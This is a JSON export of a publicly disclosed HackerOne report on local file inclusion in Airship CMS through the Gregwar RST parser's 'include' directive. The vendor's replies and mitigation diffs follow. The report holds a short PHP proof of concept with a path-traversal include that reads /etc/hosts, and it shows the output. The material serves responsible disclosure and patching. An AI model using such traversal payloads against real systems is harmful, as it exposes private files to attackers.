{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "madrobot", 
        "muhammad_uwais", 
        "ibram", 
        "bastianwelfrid", 
        "spetr0x", 
        "static"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 179034, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-10-31T12:59:43.485Z", 
    "vulnerability_information": "Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\n\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\n\nThe parser has this problem here:\n\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\n\nTo demonstrate:\n\n`rst.php`:\n\n~~~\n<?php\n\nrequire('autoload.php');\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = '*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n';\n\n// Parse it\n$html = $parser->parse($document);\n\n// Render it\necho $html;\n~~~\n\nOutput:\n\n~~~\n$ php rst.php\n<p><em>Test</em></p>\n<p>##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost </p>\n\n[...]\n~~~\n\n\n\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "User"
    }, 
    "title": "[Airship CMS] Local File Inclusion - RST Parser", 
    "is_member_of_team?": null, 
    "vote_count": 6, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-11-30T12:59:43.528Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-10-30T23:44:15.009Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-30T23:44:15.009Z", 
            "actor": {
                "username": "paragonie-scott", 
                "url": "/paragonie-scott", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/441/e8c4034a4e3ed3d486883ffc34b95daa43a499d2_medium.png?1453933942"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "paragonie", 
            "message": "Full acknowledgement.\n\nAlthough this is in a downstream library and not part of our code, this is a valid security concern that needs to be mitigated ASAP.\n\nSome immediate ideas:\n\n1. Fork and disable this directive.\n2. Create a RST snippet directory and only allow files whose realpath resolves to that directory. This will allow users to create their own RST snippets if they *really* want this functionality, but default to the equivalent of being disabled outright.", 
            "markdown_message": "<p>Full acknowledgement.</p>\n\n<p>Although this is in a downstream library and not part of our code, this is a valid security concern that needs to be mitigated ASAP.</p>\n\n<p>Some immediate ideas:</p>\n\n<ol>\n<li>Fork and disable this directive.</li>\n<li>Create a RST snippet directory and only allow files whose realpath resolves to that directory. This will allow users to create their own RST snippets if they <em>really</em> want this functionality, but default to the equivalent of being disabled outright.</li>\n</ol>\n", 
            "type": "Activities::Comment", 
            "id": 1275282, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "hextitan", 
                "url": "/hextitan"
            }, 
            "created_at": "2016-10-31T12:08:50.585Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-31T12:08:50.585Z", 
            "actor": {
                "username": "paragonie-scott", 
                "url": "/paragonie-scott", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/441/e8c4034a4e3ed3d486883ffc34b95daa43a499d2_medium.png?1453933942"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "paragonie", 
            "message": "https://github.com/Gregwar/RST/pull/34 - Contributed the fix upstream, waiting for a new release to be tagged before I tag and release Airship v1.3.2.", 
            "markdown_message": "<p><a title=\"https://github.com/Gregwar/RST/pull/34\" href=\"/redirect?signature=8a483eda826b87487e08df419e7ab45ee0d0e2a2&amp;url=https%3A%2F%2Fgithub.com%2FGregwar%2FRST%2Fpull%2F34\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Gregwar/RST/pull/34</span><i class=\"icon-external-link\"></i></a> - Contributed the fix upstream, waiting for a new release to be tagged before I tag and release Airship v1.3.2.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1275881, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-31T12:59:43.507Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-31T12:59:43.507Z", 
            "actor": {
                "username": "paragonie-scott", 
                "url": "/paragonie-scott", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/441/e8c4034a4e3ed3d486883ffc34b95daa43a499d2_medium.png?1453933942"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "paragonie", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1275957, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-31T13:00:04.960Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-31T13:00:04.960Z", 
            "actor": {
                "username": "paragonie-scott", 
                "url": "/paragonie-scott", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/441/e8c4034a4e3ed3d486883ffc34b95daa43a499d2_medium.png?1453933942"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "paragonie", 
            "message": "Thanks. v1.3.2 is released; disclosing fully.", 
            "markdown_message": "<p>Thanks. v1.3.2 is released; disclosing fully.</p>\n", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 1275958, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-31T13:30:23.829Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-31T13:30:23.829Z", 
            "actor": {
                "username": "paragonie-scott", 
                "url": "/paragonie-scott", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/441/e8c4034a4e3ed3d486883ffc34b95daa43a499d2_medium.png?1453933942"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "paragonie", 
            "message": "To anyone else reading this that uses Gregwar/RST, upgrading to v1.0.3 is not enough. You'll need to do a little bit more:\n\n### Disable File Inclusion\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(false);\n```\n\n### Jail File Inclusion to a Specific Directory\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(true, '/path/to/rst/jail');\n```\n\nNote that this supports the same syntax as PHP's open_basedir (joined with a `:` separator)\n\n```diff\n- $parser = new Gregwar\\RST\\Parser();\n+ $parser = (new Gregwar\\RST\\Parser())\n+     ->setIncludePolicy(\n+         true,\n+         implode(':', [\n+             '/var/www/common/rst-snippets',\n+             '/var/www/example.com/rst-snippets'\n+         ])\n+ );\n```\n\n### General Recommendations\n\n* If you're loading RST templates from a database, disable `include`. This is what Airship does.\n* If you're loading RST templates from the filesystem and need `include` for snippets, jail all includes to within a common directory.", 
            "markdown_message": "<p>To anyone else reading this that uses Gregwar/RST, upgrading to v1.0.3 is not enough. You&#39;ll need to do a little bit more:</p>\n\n<h3 id=\"disable-file-inclusion\">Disable File Inclusion</h3>\n<pre class=\"highlight diff\"><code><span class=\"gd\">- $parser = new Gregwar\\RST\\Parser();\n</span><span class=\"gi\">+ $parser = (new Gregwar\\RST\\Parser())\n+     -&gt;setIncludePolicy(false);\n</span></code></pre>\n<h3 id=\"jail-file-inclusion-to-a-specific-directory\">Jail File Inclusion to a Specific Directory</h3>\n<pre class=\"highlight diff\"><code><span class=\"gd\">- $parser = new Gregwar\\RST\\Parser();\n</span><span class=\"gi\">+ $parser = (new Gregwar\\RST\\Parser())\n+     -&gt;setIncludePolicy(true, &#39;/path/to/rst/jail&#39;);\n</span></code></pre>\n<p>Note that this supports the same syntax as PHP&#39;s open_basedir (joined with a <code>:</code> separator)</p>\n<pre class=\"highlight diff\"><code><span class=\"gd\">- $parser = new Gregwar\\RST\\Parser();\n</span><span class=\"gi\">+ $parser = (new Gregwar\\RST\\Parser())\n+     -&gt;setIncludePolicy(\n+         true,\n+         implode(&#39;:&#39;, [\n+             &#39;/var/www/common/rst-snippets&#39;,\n+             &#39;/var/www/example.com/rst-snippets&#39;\n+         ])\n+ );\n</span></code></pre>\n<h3 id=\"general-recommendations\">General Recommendations</h3>\n\n<ul>\n<li>If you&#39;re loading RST templates from a database, disable <code>include</code>. This is what Airship does.</li>\n<li>If you&#39;re loading RST templates from the filesystem and need <code>include</code> for snippets, jail all includes to within a common directory.</li>\n</ul>\n", 
            "type": "Activities::Comment", 
            "id": 1276008, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-04T14:18:27.632Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-04T14:18:27.632Z", 
            "actor": {
                "url": "/paragonie", 
                "profile": {
                    "name": "Paragon Initiative Enterprises"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/539/17d54b48e116d815fd72bc29f2cd71df6b3659ad_medium.?1453010804"
                }
            }, 
            "team_handle": "paragonie", 
            "message": "This was not a vulnerability in our code itself, but the report here allowed us to get a fix in the upstream library.", 
            "markdown_message": "<p>This was not a vulnerability in our code itself, but the report here allowed us to get a fix in the upstream library.</p>\n", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 1653840, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "hextitan", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/hextitan", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -63625657.529279016, 
    "disclosed_at": "2016-10-31T13:00:04.983Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/179034", 
    "created_at": "2016-10-30T23:33:43.551Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive <code>include</code> built-in (why it isn&#39;t a separate directive per the spec, I don&#39;t know). However, as a result, LFI is possible in Airship.</p>\n\n<p>I realize this isn&#39;t directly Paragonie&#39;s code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don&#39;t appear to take this side effect in to account:</p>\n\n<p><a title=\"https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\" href=\"/redirect?signature=1fd62ff4604f998c93d9dd5cf9417f034a69f095&amp;url=https%3A%2F%2Fgithub.com%2Fparagonie%2Fairship%2Fblob%2F58f96aa0e5002b60e74456502d9bfc9483d77b3d%2Fsrc%2FCabin%2FHull%2FLanding%2FCustomPages.php%23L186\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186</span><i class=\"icon-external-link\"></i></a></p>\n\n<p><a title=\"https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\" href=\"/redirect?signature=c846b68ddc3bcc99a7049cb3a27d2025efe3b17f&amp;url=https%3A%2F%2Fgithub.com%2Fparagonie%2Fairship%2Fblob%2F58f96aa0e5002b60e74456502d9bfc9483d77b3d%2Fsrc%2Flens_functions.php%23L714\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The parser has this problem here:</p>\n\n<p><a title=\"https://github.com/Gregwar/RST/blob/master/Parser.php#L762\" href=\"/redirect?signature=ada9734bd62bbff1cabc6a7d43df23cc5a69552e&amp;url=https%3A%2F%2Fgithub.com%2FGregwar%2FRST%2Fblob%2Fmaster%2FParser.php%23L762\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Gregwar/RST/blob/master/Parser.php#L762</span><i class=\"icon-external-link\"></i></a>. There doesn&#39;t appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: <a title=\"http://docutils.sourceforge.net/docs/ref/rst/directives.html#include\" href=\"/redirect?signature=944a4bbb09af319ace114ff6748f1caee432f53a&amp;url=http%3A%2F%2Fdocutils.sourceforge.net%2Fdocs%2Fref%2Frst%2Fdirectives.html%23include\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://docutils.sourceforge.net/docs/ref/rst/directives.html#include</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>To demonstrate:</p>\n\n<p><code>rst.php</code>:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n\nrequire(&#39;autoload.php&#39;);\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = &#39;*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n&#39;;\n\n// Parse it\n$html = $parser-&gt;parse($document);\n\n// Render it\necho $html;\n</code></pre>\n<p>Output:</p>\n<pre class=\"highlight plaintext\"><code>$ php rst.php\n&lt;p&gt;&lt;em&gt;Test&lt;/em&gt;&lt;/p&gt;\n&lt;p&gt;##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1   localhost\n255.255.255.255 broadcasthost\n::1             localhost &lt;/p&gt;\n\n[...]\n</code></pre>", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://github.com/paragonie", 
            "about": "Cryptography and Application Security Consultants - We Produce Various Open Source Libraries", 
            "twitter_handle": "ParagonIE", 
            "name": "Paragon Initiative Enterprises"
        }, 
        "handle": "paragonie", 
        "url": "https://hackerone.com/paragonie", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/008/539/a041268a04bb7a5c3d3a88a9dccc6b5955eff4d7_small.?1453010804", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/008/539/17d54b48e116d815fd72bc29f2cd71df6b3659ad_medium.?1453010804"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 8539, 
        "default_currency": "usd"
    }, 
    "is_published": false
}